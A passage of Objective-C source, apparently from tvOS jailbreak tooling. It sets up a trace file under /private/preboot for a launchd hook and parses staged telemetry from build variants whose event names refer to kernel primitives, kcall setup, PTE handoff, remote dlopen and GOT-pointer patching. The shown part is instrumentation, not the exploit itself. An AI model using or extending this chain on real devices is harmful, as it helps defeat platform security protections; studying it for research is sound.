    NSString *trace = [basebin stringByAppendingPathComponent:@".dt102735_constructor_trace"];
    const char *traceBuild = "102735";
#endif
    NSString *expectedHook = [basebin stringByAppendingPathComponent:@"launchdhook516.dylib"];

    dt102735d_copy_string(ctx->basebin_path, sizeof(ctx->basebin_path), basebin);
    dt102735d_copy_string(ctx->hook_path, sizeof(ctx->hook_path), hook);
    dt102735d_copy_string(ctx->trace_path, sizeof(ctx->trace_path), trace);

    ctx->path_under_preboot = dt102735d_path_has_prefix_component(trace, @"/private/preboot");
    ctx->path_under_var_jb = dt102735d_path_has_prefix_component(trace, @"/private/var/jb");
    BOOL basebin_ok = [basebin hasPrefix:@"/private/preboot/"]
        && [basebin hasSuffix:@"/dopamin-tvos-102710/procursus/basebin"];
    BOOL hook_ok = [hook isEqualToString:expectedHook];
    BOOL path_ok = basebin_ok && hook_ok && ctx->path_under_preboot && !ctx->path_under_var_jb;

    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_CANONICAL_BASEBIN_PATH=%s",
        ctx->basebin_path[0] ? ctx->basebin_path : "UNAVAILABLE"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PATH=%s",
        ctx->trace_path[0] ? ctx->trace_path : "UNAVAILABLE"] UTF8String]);
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_TRACE_PATH=%s",
        ctx->trace_path[0] ? ctx->trace_path : "UNAVAILABLE"] UTF8String]);
    dt699_stage("BUILD102737D_PRIVATE_VAR_JB_DIAGNOSTIC_USAGE=NO");
    dt699_stage("BUILD102737D_HOOK_TRACE_PATH_SOURCE=DLADDR_ON_HOOK_IMAGE");
    dt699_stage("BUILD102737D_HOOK_MANIFEST_HASH_HARDCODED=NO");
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_TRACE_PATH=%s",
        ctx->trace_path[0] ? ctx->trace_path : "UNAVAILABLE"] UTF8String]);
    dt699_stage("BUILD102738P_TRACE_TRANSPORT_REUSED_FROM_102737=YES");
#endif
#endif
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PATH_UNDER_PRIVATE_PREBOOT=%s",
        dt102735d_yesno(ctx->path_under_preboot)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PATH_UNDER_PRIVATE_VAR_JB=%s",
        dt102735d_yesno(ctx->path_under_var_jb)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_CANONICAL_BASEBIN_SUFFIX_MATCH=%s",
        dt102735d_yesno(basebin_ok)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_STAGED_HOOK_PATH_MATCHES_CANONICAL=%s",
        dt102735d_yesno(hook_ok)] UTF8String]);

    const char *trace_path = ctx->trace_path;
    struct stat lst;
    if (!trace_path[0]) {
        ctx->clear_rc = -EINVAL;
    } else if (lstat(trace_path, &lst) == 0) {
        ctx->preexisted = YES;
        if (unlink(trace_path) == 0)
            ctx->clear_rc = 0;
        else
            ctx->clear_rc = -errno;
    } else if (errno == ENOENT) {
        ctx->clear_rc = 0;
    } else {
        ctx->clear_rc = -errno;
    }
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PREEXISTED=%s",
        dt102735d_yesno(ctx->preexisted)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_CLEAR_RC=%d",
        ctx->clear_rc] UTF8String]);

    if (path_ok && ctx->clear_rc == 0) {
        int fd = open(trace_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC | O_NOFOLLOW, 0666);
        if (fd >= 0) {
            if (fchmod(fd, 0666) == 0)
                ctx->create_rc = 0;
            else
                ctx->create_rc = -errno;
            struct stat st;
            if (fstat(fd, &st) == 0) {
                ctx->dev = st.st_dev;
                ctx->ino = st.st_ino;
                ctx->mode = st.st_mode;
                ctx->uid = st.st_uid;
                ctx->gid = st.st_gid;
                ctx->size = st.st_size;
                ctx->mtime = st.st_mtime;
                ctx->is_regular = S_ISREG(st.st_mode);
            }

            NSTimeInterval run_start = [[NSDate date] timeIntervalSince1970];
            int hn = snprintf(ctx->header, sizeof(ctx->header),
                "BUILD=%s EVENT=TRACE_READY RUN_START=%.3f\n", traceBuild, run_start);
            if (hn > 0 && (size_t)hn < sizeof(ctx->header)) {
                ctx->header_len = (size_t)hn;
                ctx->header_write_rc = dt102735d_write_all(fd,
                    (const uint8_t *)ctx->header, ctx->header_len);
                if (ctx->header_write_rc == 0 && fsync(fd) != 0)
                    ctx->header_write_rc = -errno;
            } else {
                ctx->header_write_rc = -EINVAL;
            }
            close(fd);

            struct stat rst;
            int read_rc = 0;
            NSData *readback = dt102735d_read_regular_file(trace_path, &rst, &read_rc);
            ctx->header_readback = read_rc == 0 && readback.length >= ctx->header_len
                && memcmp(readback.bytes, ctx->header, ctx->header_len) == 0
                && rst.st_dev == ctx->dev && rst.st_ino == ctx->ino;
            if (read_rc == 0) {
                ctx->mode = rst.st_mode;
                ctx->uid = rst.st_uid;
                ctx->gid = rst.st_gid;
                ctx->size = rst.st_size;
                ctx->mtime = rst.st_mtime;
                ctx->is_regular = S_ISREG(rst.st_mode);
            }
        } else {
            ctx->create_rc = -errno;
        }
    }

    ctx->preflight_pass = path_ok && ctx->clear_rc == 0 && ctx->create_rc == 0
        && ctx->is_regular && ctx->header_write_rc == 0 && ctx->header_readback;

    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_CREATE_RC=%d",
        ctx->create_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_IS_REGULAR_FILE=%s",
        dt102735d_yesno(ctx->is_regular)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_MODE=0%o",
        (unsigned)(ctx->mode & 07777)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_OWNER_UID=%u",
        (unsigned)ctx->uid] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_OWNER_GID=%u",
        (unsigned)ctx->gid] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_HEADER_WRITE_RC=%d",
        ctx->header_write_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_HEADER_READBACK=%@",
        ctx->header_readback ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_TRACE_PREFLIGHT=%@",
        ctx->preflight_pass ? @"PASS" : @"FAIL"] UTF8String]);
    return ctx->preflight_pass ? 0 : -1;
}

static int dt102735d_extract_remote_dlopen_rc(NSString *capture)
{
    if (!capture.length)
        return INT_MIN;
    for (NSString *line in [capture componentsSeparatedByString:@"\n"]) {
        NSString *prefix = @"BUILD102736C_REMOTE_DLOPEN_RC=";
        if ([line hasPrefix:prefix])
            return (int)[[line substringFromIndex:prefix.length] integerValue];
        prefix = @"BUILD102734C_REMOTE_DLOPEN_RC=";
        if ([line hasPrefix:prefix])
            return (int)[[line substringFromIndex:prefix.length] integerValue];
        prefix = @"REMOTE_DLOPEN_RC=";
        if ([line hasPrefix:prefix])
            return (int)[[line substringFromIndex:prefix.length] integerValue];
    }
    return INT_MIN;
}

#ifdef DT_BUILD102739A_VARIANT
static BOOL dt102739a_extract_counter(NSString *capture, uint64_t *countOut)
{
    NSString *prefix = @"BUILD102739A_POST_WALL2_INVOCATION_COUNT=";
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        if ([line hasPrefix:prefix]) {
            const char *value = [line substringFromIndex:prefix.length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno == 0 && end && *end == '\0') {
                if (countOut)
                    *countOut = (uint64_t)parsed;
                return YES;
            }
        }
    }
    return NO;
}
#endif

#ifdef DT_BUILD102739C_VARIANT
typedef struct {
    uint64_t entry_count;
    uint64_t return_count;
    uint64_t success_return_count;
    uint64_t xout_argument_count;
    uint64_t success_xout_count;
    uint64_t success_object_count;
} dt102739c_output_telemetry_t;

static BOOL dt102739c_extract_output_telemetry(NSString *capture,
    dt102739c_output_telemetry_t *telemetryOut)
{
    NSString *prefixes[] = {
        @"BUILD102739C_POST_WALL2_ENTRY_COUNT=",
        @"BUILD102739C_POST_WALL2_RETURN_COUNT=",
        @"BUILD102739C_SUCCESS_RETURN_COUNT=",
        @"BUILD102739C_XOUT_ARGUMENT_COUNT=",
        @"BUILD102739C_SUCCESS_XOUT_COUNT=",
        @"BUILD102739C_SUCCESS_OBJECT_COUNT=",
    };
    dt102739c_output_telemetry_t telemetry = {0};
    uint64_t *values[] = {
        &telemetry.entry_count,
        &telemetry.return_count,
        &telemetry.success_return_count,
        &telemetry.xout_argument_count,
        &telemetry.success_xout_count,
        &telemetry.success_object_count,
    };
    BOOL found[6] = {NO};
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 6; i++) {
            if (![line hasPrefix:prefixes[i]])
                continue;
            const char *value = [line substringFromIndex:prefixes[i].length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno != 0 || !end || *end != '\0')
                return NO;
            *values[i] = (uint64_t)parsed;
            found[i] = YES;
        }
    }
    for (NSUInteger i = 0; i < 6; i++) {
        if (!found[i])
            return NO;
    }
    if (telemetryOut)
        *telemetryOut = telemetry;
    return YES;
}
#ifdef DT_BUILD102739D_VARIANT
static BOOL dt102739d_extract_trigger_deltas(NSString *capture,
    uint64_t *entryDeltaOut, uint64_t *returnDeltaOut,
    uint64_t *successObjectDeltaOut, int *sendRcOut)
{
#ifdef DT_BUILD102739J_VARIANT
    NSString *entryPrefix = @"BUILD102739J_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739J_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739J_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739J_SUCCESS_OBJECT_DELTA=";
#elif defined(DT_BUILD102739I_VARIANT)
    NSString *entryPrefix = @"BUILD102739I_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739I_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739I_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739I_SUCCESS_OBJECT_DELTA=";
#elif defined(DT_BUILD102739H_VARIANT)
    NSString *entryPrefix = @"BUILD102739H_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739H_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739H_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739H_SUCCESS_OBJECT_DELTA=";
#elif defined(DT_BUILD102739G_VARIANT)
    NSString *entryPrefix = @"BUILD102739G_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739G_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739G_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739G_SUCCESS_OBJECT_DELTA=";
#elif defined(DT_BUILD102739F_VARIANT)
    NSString *entryPrefix = @"BUILD102739F_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739F_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739F_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739F_SUCCESS_OBJECT_DELTA=";
#elif defined(DT_BUILD102739E_VARIANT)
    NSString *entryPrefix = @"BUILD102739E_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739E_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739E_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739E_SUCCESS_OBJECT_DELTA=";
#else
    NSString *entryPrefix = @"BUILD102739D_ENTRY_DELTA=";
    NSString *returnPrefix = @"BUILD102739D_RETURN_DELTA=";
    NSString *sendPrefix = @"BUILD102739D_TRIGGER_SEND_COMPLETED_RC=";
    NSString *successObjectPrefix = @"BUILD102739D_SUCCESS_OBJECT_DELTA=";
#endif
    BOOL entryFound = NO, returnFound = NO, successObjectFound = NO, sendFound = NO;
    uint64_t entryDelta = 0, returnDelta = 0, successObjectDelta = 0;
    int sendRc = INT_MIN;
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        if ([line hasPrefix:entryPrefix]) {
            entryDelta = strtoull([line substringFromIndex:entryPrefix.length].UTF8String,
                NULL, 10);
            entryFound = YES;
        } else if ([line hasPrefix:returnPrefix]) {
            returnDelta = strtoull([line substringFromIndex:returnPrefix.length].UTF8String,
                NULL, 10);
            returnFound = YES;
        } else if ([line hasPrefix:sendPrefix]) {
            sendRc = (int)strtol([line substringFromIndex:sendPrefix.length].UTF8String,
                NULL, 10);
            sendFound = YES;
        } else if ([line hasPrefix:successObjectPrefix]) {
            successObjectDelta = strtoull(
                [line substringFromIndex:successObjectPrefix.length].UTF8String,
                NULL, 10);
            successObjectFound = YES;
        }
    }
    if (entryDeltaOut)
        *entryDeltaOut = entryDelta;
    if (returnDeltaOut)
        *returnDeltaOut = returnDelta;
    if (successObjectDeltaOut)
        *successObjectDeltaOut = successObjectDelta;
    if (sendRcOut)
        *sendRcOut = sendRc;
    return entryFound && returnFound && successObjectFound && sendFound;
}
#ifdef DT_BUILD102739E_VARIANT
static BOOL dt102739e_extract_classifier_deltas(NSString *capture,
    uint64_t *dictionaryDeltaOut, uint64_t *envelopeDeltaOut,
    uint64_t *exactProbeDeltaOut)
{
    NSString *prefixes[] = {
        @"BUILD102739E_DICTIONARY_OBJECT_DELTA=",
        @"BUILD102739E_DOMAIN_ACTION_ENVELOPE_DELTA=",
        @"BUILD102739E_EXACT_CONTROLLED_PROBE_DELTA=",
    };
    uint64_t values[3] = {0};
    BOOL found[3] = {NO};
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 3; i++) {
            if (![line hasPrefix:prefixes[i]])
                continue;
            const char *value = [line substringFromIndex:prefixes[i].length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno != 0 || !end || *end != '\0')
                return NO;
            values[i] = (uint64_t)parsed;
            found[i] = YES;
        }
    }
    if (!(found[0] && found[1] && found[2]))
        return NO;
    if (dictionaryDeltaOut) *dictionaryDeltaOut = values[0];
    if (envelopeDeltaOut) *envelopeDeltaOut = values[1];
    if (exactProbeDeltaOut) *exactProbeDeltaOut = values[2];
    return YES;
}
#endif
#ifdef DT_BUILD102739F_VARIANT
static BOOL dt102739f_extract_identity_deltas(NSString *capture,
    uint64_t *dictionaryDeltaOut, uint64_t *envelopeDeltaOut,
    uint64_t *exactProbeDeltaOut, uint64_t *domainNonzeroDeltaOut,
    uint64_t *systemwideDomainDeltaOut, uint64_t *auditTokenDeltaOut,
    BOOL *pidMatchOut, BOOL *euidMatchOut)
{
#ifdef DT_BUILD102739J_VARIANT
    NSString *identityPrefix = @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
    NSString *identityPrefix = @"BUILD102739I";
#elif defined(DT_BUILD102739H_VARIANT)
    NSString *identityPrefix = @"BUILD102739H";
#elif defined(DT_BUILD102739G_VARIANT)
    NSString *identityPrefix = @"BUILD102739G";
#else
    NSString *identityPrefix = @"BUILD102739F";
#endif
    NSString *prefixes[] = {
        [identityPrefix stringByAppendingString:@"_DICTIONARY_OBJECT_DELTA="],
        [identityPrefix stringByAppendingString:@"_DOMAIN_ACTION_ENVELOPE_DELTA="],
        [identityPrefix stringByAppendingString:@"_EXACT_CONTROLLED_PROBE_DELTA="],
        [identityPrefix stringByAppendingString:@"_DOMAIN_NONZERO_DELTA="],
        [identityPrefix stringByAppendingString:@"_SYSTEMWIDE_DOMAIN_CANDIDATE_DELTA="],
        [identityPrefix stringByAppendingString:@"_AUDIT_TOKEN_CAPTURE_DELTA="],
    };
    uint64_t values[6] = {0};
    BOOL found[6] = {NO};
    BOOL pidMatchFound = NO, euidMatchFound = NO;
    BOOL pidMatch = NO, euidMatch = NO;
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 6; i++) {
            if (![line hasPrefix:prefixes[i]])
                continue;
            const char *value = [line substringFromIndex:prefixes[i].length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno != 0 || !end || *end != '\0')
                return NO;
            values[i] = (uint64_t)parsed;
            found[i] = YES;
        }
        NSString *pidPrefix = [identityPrefix stringByAppendingString:@"_TOKEN_PID_MATCH="];
        NSString *euidPrefix = [identityPrefix stringByAppendingString:@"_TOKEN_EUID_MATCH="];
        if ([line hasPrefix:pidPrefix]) {
            NSString *value = [line substringFromIndex:
                pidPrefix.length];
            pidMatch = [value isEqualToString:@"YES"];
            pidMatchFound = YES;
        } else if ([line hasPrefix:euidPrefix]) {
            NSString *value = [line substringFromIndex:
                euidPrefix.length];
            euidMatch = [value isEqualToString:@"YES"];
            euidMatchFound = YES;
        }
    }
    for (NSUInteger i = 0; i < 6; i++) {
        if (!found[i])
            return NO;
    }
    if (!pidMatchFound || !euidMatchFound)
        return NO;
    if (dictionaryDeltaOut) *dictionaryDeltaOut = values[0];
    if (envelopeDeltaOut) *envelopeDeltaOut = values[1];
    if (exactProbeDeltaOut) *exactProbeDeltaOut = values[2];
    if (domainNonzeroDeltaOut) *domainNonzeroDeltaOut = values[3];
    if (systemwideDomainDeltaOut) *systemwideDomainDeltaOut = values[4];
    if (auditTokenDeltaOut) *auditTokenDeltaOut = values[5];
    if (pidMatchOut) *pidMatchOut = pidMatch;
    if (euidMatchOut) *euidMatchOut = euidMatch;
    return YES;
}
#ifdef DT_BUILD102739G_VARIANT
static BOOL dt102739g_extract_resolution_deltas(NSString *capture,
    uint64_t valuesOut[8])
{
#ifdef DT_BUILD102739J_VARIANT
    NSString *resolutionPrefix = @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
    NSString *resolutionPrefix = @"BUILD102739I";
#elif defined(DT_BUILD102739H_VARIANT)
    NSString *resolutionPrefix = @"BUILD102739H";
#else
    NSString *resolutionPrefix = @"BUILD102739G";
#endif
    NSString *prefixes[] = {
        [resolutionPrefix stringByAppendingString:@"_DOMAIN_RESOLUTION_ATTEMPT_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_DOMAIN_RESOLUTION_SUCCESS_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_PERMISSION_CHECK_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_PERMISSION_ALLOW_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_ACTION_NONZERO_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_ACTION_RESOLUTION_ATTEMPT_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_ACTION_RESOLUTION_SUCCESS_DELTA="],
        [resolutionPrefix stringByAppendingString:@"_HANDLER_INVOCATION_DELTA="],
    };
    BOOL found[8] = {NO};
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 8; i++) {
            if (![line hasPrefix:prefixes[i]])
                continue;
            const char *value = [line substringFromIndex:prefixes[i].length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno != 0 || !end || *end != '\0')
                return NO;
            valuesOut[i] = (uint64_t)parsed;
            found[i] = YES;
        }
    }
    for (NSUInteger i = 0; i < 8; i++) {
        if (!found[i])
            return NO;
    }
    return YES;
}
#ifdef DT_BUILD102739H_VARIANT
static BOOL dt102739h_extract_argument_deltas(NSString *capture,
    uint64_t valuesOut[11])
{
#ifdef DT_BUILD102739J_VARIANT
    NSString *argumentPrefix = @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
    NSString *argumentPrefix = @"BUILD102739I";
#else
    NSString *argumentPrefix = @"BUILD102739H";
#endif
    NSString *prefixes[] = {
        [argumentPrefix stringByAppendingString:@"_HANDLER_POINTER_CAPTURE_DELTA="],
        [argumentPrefix stringByAppendingString:@"_HANDLER_POINTER_NONNULL_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARGS_ZERO_INITIALIZED_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARGSOUT_ZERO_INITIALIZED_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARG_DESCRIPTOR_SCAN_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARG_NAME_ROOT_PATH_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARG_TYPE_STRING_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARG_DIRECTION_OUT_DELTA="],
        [argumentPrefix stringByAppendingString:@"_OUTPUT_SLOT_BIND_DELTA="],
        [argumentPrefix stringByAppendingString:@"_ARG_TERMINATOR_FOUND_DELTA="],
        [argumentPrefix stringByAppendingString:@"_MARSHALLING_COMPLETE_DELTA="],
    };
    BOOL found[11] = {NO};
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 11; i++) {
            if (![line hasPrefix:prefixes[i]]) continue;
            unsigned long long value = 0;
            NSScanner *scanner = [NSScanner scannerWithString:
                [line substringFromIndex:prefixes[i].length]];
            if ([scanner scanUnsignedLongLong:&value]) {
                valuesOut[i] = (uint64_t)value;
                found[i] = YES;
            }
        }
    }
    for (NSUInteger i = 0; i < 11; i++) {
        if (!found[i]) return NO;
    }
    return YES;
}
#ifdef DT_BUILD102739I_VARIANT
static BOOL dt102739i_extract_handler_deltas(NSString *capture,
    uint64_t valuesOut[9])
{
    NSString *names[] = {
        @"HANDLER_CALL_ATTEMPT", @"HANDLER_RETURN",
        @"HANDLER_ARG0_OUTPUT_SLOT_MATCH", @"HANDLER_ARGS1_THROUGH_7_NULL",
        @"HANDLER_OUTPUT_WRITE", @"ARGSOUT0_SENTINEL_MATCH",
        @"ARGSOUT_TAIL_NULL", @"HANDLER_RESULT_MATCH",
        @"CONTROLLED_HANDLER_COMPLETE",
    };
    BOOL found[9] = {NO};
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        for (NSUInteger i = 0; i < 9; i++) {
            NSString *prefix = [NSString stringWithFormat:
#ifdef DT_BUILD102739J_VARIANT
                @"BUILD102739J_%@_DELTA=",
#else
                @"BUILD102739I_%@_DELTA=",
#endif
                names[i]];
            if (![line hasPrefix:prefix]) continue;
            const char *value = [line substringFromIndex:prefix.length].UTF8String;
            char *end = NULL;
            errno = 0;
            unsigned long long parsed = strtoull(value, &end, 10);
            if (errno != 0 || !end || *end != '\0') return NO;
            valuesOut[i] = (uint64_t)parsed;
            found[i] = YES;
        }
    }
    for (NSUInteger i = 0; i < 9; i++) {
        if (!found[i]) return NO;
    }
    return YES;
}
#endif
#endif
#endif
#endif
#endif
#elif defined(DT_BUILD102739B_VARIANT)
static BOOL dt102739b_extract_return_telemetry(NSString *capture,
    uint64_t *entryOut, uint64_t *returnOut)
{
    NSString *entryPrefix = @"BUILD102739B_POST_WALL2_ENTRY_COUNT=";
    NSString *returnPrefix = @"BUILD102739B_POST_WALL2_RETURN_COUNT=";
    BOOL entryFound = NO;
    BOOL returnFound = NO;
    uint64_t entryValue = 0;
    uint64_t returnValue = 0;
    for (NSString *line in [capture componentsSeparatedByCharactersInSet:
            [NSCharacterSet newlineCharacterSet]]) {
        NSString *prefix = nil;
        uint64_t *destination = NULL;
        BOOL *found = NULL;
        if ([line hasPrefix:entryPrefix]) {
            prefix = entryPrefix;
            destination = &entryValue;
            found = &entryFound;
        } else if ([line hasPrefix:returnPrefix]) {
            prefix = returnPrefix;
            destination = &returnValue;
            found = &returnFound;
        } else {
            continue;
        }
        const char *value = [line substringFromIndex:prefix.length].UTF8String;
        char *end = NULL;
        errno = 0;
        unsigned long long parsed = strtoull(value, &end, 10);
        if (errno != 0 || !end || *end != '\0')
            return NO;
        *destination = (uint64_t)parsed;
        *found = YES;
    }
    if (!entryFound || !returnFound)
        return NO;
    if (entryOut)
        *entryOut = entryValue;
    if (returnOut)
        *returnOut = returnValue;
    return YES;
}
#endif

static NSString *dt102735d_event_from_line(NSString *line)
{
    NSRange er = [line rangeOfString:@"EVENT="];
    if (er.location == NSNotFound)
        return nil;
    NSUInteger start = er.location + er.length;
    if (start >= line.length)
        return nil;
    NSRange rest = NSMakeRange(start, line.length - start);
    NSRange space = [line rangeOfString:@" " options:0 range:rest];
    NSUInteger end = space.location == NSNotFound ? line.length : space.location;
    if (end <= start)
        return nil;
    return [line substringWithRange:NSMakeRange(start, end - start)];
}

static long long dt102735d_value_from_line(NSString *line, BOOL *ok)
{
    if (ok)
        *ok = NO;
    NSRange vr = [line rangeOfString:@"VALUE="];
    if (vr.location == NSNotFound)
        return 0;
    NSUInteger start = vr.location + vr.length;
    if (start >= line.length)
        return 0;
    NSRange rest = NSMakeRange(start, line.length - start);
    NSRange space = [line rangeOfString:@" " options:0 range:rest];
    NSUInteger end = space.location == NSNotFound ? line.length : space.location;
    NSString *value = [line substringWithRange:NSMakeRange(start, end - start)];
    if (ok)
        *ok = YES;
    return strtoll(value.UTF8String, NULL, 0);
}

static BOOL dt102735d_event_is_terminal(NSString *event)
{
    if (!event.length)
        return NO;
    if ([event isEqualToString:@"CTOR_RETURN_PASS"]
        || [event isEqualToString:@"CTOR_RETURN_FAIL"]
        || [event isEqualToString:@"GOT_PROBE_TERMINAL_PASS"]
        || [event isEqualToString:@"GOT_PROBE_TERMINAL_FAIL"]
        || [event isEqualToString:@"GOT_PROTECTION_RESTORE_FATAL"]
        || [event isEqualToString:@"BOOMERANG_DONE_SEND_FAIL"])
        return YES;
    if ([event hasPrefix:@"PRIMITIVES_"] && [event hasSuffix:@"_FAIL"])
        return YES;
    if ([event hasPrefix:@"PTE_HANDOFF_REQUEST_FAIL"]
        || [event hasPrefix:@"PTE_HANDOFF_CLIENT_DECODE_FAIL"])
        return YES;
    return NO;
}

static void dt102735d_note_failure(dt102735d_trace_observation_t *obs, NSString *event)
{
    if (!obs || obs->failure_result[0] || !event.length)
        return;
    static const char *const exactFailures[] = {
        "SYMBOL_RESOLUTION_FAIL",
        "MACH_PORTS_LOOKUP_FAIL",
        "REGISTERED_PORT_COUNT_FAIL",
        "REGISTERED_PORT2_INVALID",
        "MACH_PORTS_REGISTER_FAIL",
        "PRIMITIVES_NON_ROOT",
        "PRIMITIVES_TARGET_GATE_FAIL",
        "PRIMITIVES_PTE_UNSUPPORTED",
        "PRIMITIVES_SYSINFO_FAIL",
        "PRIMITIVES_PTE_HANDOFF_FAIL",
        "PRIMITIVES_PTE_INIT_FAIL",
        "PRIMITIVES_TRANSLATION_FAIL",
        "PRIMITIVES_KCALL_INIT_FAIL",
        "PTE_HANDOFF_REQUEST_FAIL",
        "PTE_HANDOFF_CLIENT_DECODE_FAIL",
        "BOOMERANG_DONE_SEND_FAIL",
        "GOT_PROBE_TERMINAL_FAIL",
        "GOT_PROTECTION_RESTORE_FATAL",
        "GOT_PRESTORE_POINTER_CHANGED_FAIL",
        "GOT_SAME_VALUE_STORE_NOT_ATTEMPTED_FAIL",
        "GOT_SAME_VALUE_STORE_READBACK_FAIL",
        "GOT_WRAPPER_STORE_NOT_ATTEMPTED_FAIL",
        "GOT_WRAPPER_READBACK_FAIL",
        "GOT_ORIGINAL_RESTORE_NOT_ATTEMPTED_FAIL",
        "GOT_ORIGINAL_RESTORE_READBACK_FAIL",
        "GOT_WRAPPER_POINTER_IDENTITY_FAIL",
        "GOT_WRAPPER_EXEC_MAPPING_FAIL",
        "GOT_WRAPPER_IMAGE_RANGE_FAIL",
        "GOT_WRAPPER_INSTALL_VALIDATION_FAIL",
        "GOT_WRAPPER_NOT_INVOKED_FAIL",
    };
    const char *event_c = event.UTF8String;
    for (size_t i = 0; i < sizeof(exactFailures) / sizeof(exactFailures[0]); i++) {
        if (event_c && strcmp(event_c, exactFailures[i]) == 0) {
            dt102735d_copy_cstr(obs->failure_result, sizeof(obs->failure_result),
                event_c);
            return;
        }
    }
}

static void dt102735d_update_observation(dt102735d_trace_observation_t *obs, NSString *line)
{
    if (!obs || !line.length)
        return;
    NSString *event = dt102735d_event_from_line(line);
    if (!event.length)
        return;

    dt102735d_copy_cstr(obs->last_event, sizeof(obs->last_event), event.UTF8String);
    dt102735d_copy_cstr(obs->last_confirmed_stage, sizeof(obs->last_confirmed_stage),
        event.UTF8String);
    dt102735d_copy_cstr(obs->actual_stop_point, sizeof(obs->actual_stop_point),
        event.UTF8String);

    if ([event isEqualToString:@"CTOR_ENTER"])
        obs->constructor_entered = YES;
    else if ([event isEqualToString:@"PRIMITIVES_INIT_PASS"])
        obs->primitives_init_pass = YES;
    else if ([event isEqualToString:@"BOOMERANG_DONE_SEND_PASS"])
        obs->boomerang_done_send_pass = YES;
    else if ([event isEqualToString:@"CTOR_RETURN_PASS"])
        obs->ctor_return_pass = YES;
    else if ([event isEqualToString:@"CTOR_RETURN_FAIL"])
        obs->ctor_return_fail = YES;
    else if ([event isEqualToString:@"CTOR_EXIT_REACHED"])
        obs->ctor_exit_reached = YES;
    else if ([event isEqualToString:@"BUILD102738P_PROBE_ENTER"]
